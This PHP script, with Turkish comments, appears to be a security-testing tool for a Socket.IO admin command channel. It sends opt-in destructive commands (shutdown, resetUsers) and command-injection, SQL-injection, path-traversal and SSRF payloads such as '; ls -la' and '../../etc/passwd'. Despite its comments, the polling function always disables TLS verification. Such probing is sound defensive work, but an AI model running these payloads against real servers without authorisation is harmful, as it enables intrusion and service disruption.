<?php
/**
 * Socket.IO Güvenlik Test Scripti
 * 
 * Bu script, Socket.IO tabanlı bir sunucuya yönelik
 * çeşitli komutlar ve payloadlar göndererek zafiyetleri test eder.
 * 
 * Özellikler:
 * - SID alma (Session ID)
 * - Polling transport ile komut gönderme ve cevap alma
 * - WebSocket bağlantısı denemesi (textalk/websocket kütüphanesi ile)
 * - Farklı komut ve payload testleri
 * - Log dosyasına detaylı kayıt
 * - 3 test döngüsü, kullanıcı tarafından değiştirilebilir
 * - SSL doğrulaması kapalı (local test için)
 * 
 * KULLANIM:
 * - composer require textalk/websocket ile websocket kütüphanesi kurulmalıdır.
 * - $baseUrl değişkenini test edilecek socket.io endpoint adresi ile değiştirin.
 * - Script komut satırında veya web üzerinden çalıştırılabilir.
 */

require __DIR__ . '/vendor/autoload.php'; // websocket kütüphanesi için autoload

use WebSocket\Client;

date_default_timezone_set('Europe/Istanbul');

$baseUrl = 'https://YOUR-SOCKET-IO-ENDPOINT/socket.io/?type=admin&EIO=4&transport=polling';
$logFile = __DIR__ . '/socket_attack.log';
$testLoops = 3; // Test döngüsü sayısı, ihtiyaca göre değiştirilebilir
$enableDestructiveTests = getenv('SOCKETIO_ENABLE_DESTRUCTIVE_TESTS') === '1';

// TLS doğrulaması varsayılan olarak açıktır. Yalnızca kontrollü yerel testte opt-out edin.
function sslOptions() {
    $insecure = getenv('SOCKETIO_INSECURE_TLS') === '1';
    return [
        'verify_peer' => !$insecure,
        'verify_peer_name' => !$insecure
    ];
}

// Log fonksiyonu
function logMessage($msg) {
    global $logFile;
    $time = date('[Y-m-d H:i:s]');
    file_put_contents($logFile, "$time $msg\n", FILE_APPEND);
    echo $msg . PHP_EOL;
}

// SID alma fonksiyonu
function getSID() {
    global $baseUrl;
    $context = stream_context_create([
        "ssl" => sslOptions()
    ]);
    $response = file_get_contents($baseUrl, false, $context);
    if ($response === false) {
        logMessage("❌ SID alınamadı!");
        return false;
    }
    // SID response formatı: 0{"sid":"...","upgrades":[...]}
    if (preg_match('/"sid":"([^"]+)"/', $response, $matches)) {
        return $matches[1];
    }
    return false;
}

// Polling üzerinden komut gönderme
function sendPollingCommand($sid, $command) {
    global $baseUrl;
    $url = $baseUrl . '&sid=' . urlencode($sid);
    $postData = '42' . json_encode(['admin:cmd', ['cmd' => $command]], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $opts = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: text/plain;charset=UTF-8\r\n",
            "content" => $postData,
            "ignore_errors" => true,
            "timeout" => 10,
            "protocol_version" => 1.1,
        ],
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false
        ]
    ];
    $context = stream_context_create($opts);
    $response = file_get_contents($url, false, $context);
    if ($response === false) {
        return false;
    }
    // Gelen cevap genellikle: 42["admin:cmd",{"success":true,"data":"ok"}]
    if (preg_match('/"data":"([^"]*)"/', $response, $matches)) {
        return $matches[1];
    }
    return $response;
}

// WebSocket bağlantısı ve komut gönderme
function websocketTest($sid) {
    // WebSocket URL örneği
    $wsUrl = "wss://YOUR-SOCKET-IO-ENDPOINT/socket.io/?type=admin&EIO=4&transport=websocket&sid=$sid";
    try {
        $client = new Client($wsUrl, [
            'timeout' => 10,
            'headers' => [
                'Origin' => 'https://example.com'
            ],
            'context' => stream_context_create([
                'ssl' => sslOptions()
            ])
        ]);
        // Socket.io protokolü 40 ile bağlantı başlatılır
        $client->send('40');
        // Komut gönderme örneği
        $client->send('42["admin:cmd",{"cmd":"status"}]');
        $response = $client->receive();
        $client->close();
        return $response;
    } catch (Exception $e) {
        return 'WebSocket hata: ' . $e->getMessage();
    }
}

// Testte kullanılacak komutlar ve payloadlar
$commands = ["getStatus"];
if ($enableDestructiveTests) {
    $commands = array_merge($commands, [
        "shutdown",
        "clearCache",
        "updateSettings",
        "resetUsers"
    ]);
}
$payloads = [
    "; ls -la",
    "| whoami",
    "' OR 1=1--",
    "../../etc/passwd",
    "http://127.0.0.1:80"
];

// Test döngüleri
for ($i = 1; $i <= $testLoops; $i++) {
    logMessage("🧪 Test Döngüsü #$i başlatıldı...");

    $sid = getSID();
    if (!$sid) {
        logMessage("❌ SID alınamadı. Döngü sonlandırıldı.");
        continue;
    }
    logMessage("✅ SID alındı: $sid");

    // Polling üzerinden normal komutlar
    foreach ($commands as $cmd) {
        $resp = sendPollingCommand($sid, $cmd);
        logMessage("💡 Komut: $cmd → Yanıt: " . ($resp ?: 'Boş'));
    }

    // Polling üzerinden zararlı payload testleri
    foreach ($payloads as $pl) {
        $resp = sendPollingCommand($sid, $pl);
        logMessage("💣 Payload: $pl → Yanıt: " . ($resp ?: 'Boş'));
    }

    // WebSocket testi
    logMessage("🌐 WebSocket testi başlatılıyor...");
    $wsResp = websocketTest($sid);
    logMessage("🌐 WebSocket yanıtı: $wsResp");

    // Sunucu kapatma yalnızca açıkça etkinleştirildiğinde çalıştırılır.
    if ($enableDestructiveTests) {
        $endResp = sendPollingCommand($sid, "shutdown");
        logMessage("🛑 Sonlandırma komutu gönderildi. Yanıt: " . ($endResp ?: 'Boş'));
    }

    logMessage("✅ Test döngüsü #$i tamamlandı.\n");
}

logMessage("🎯 Tüm test döngüleri tamamlandı.");
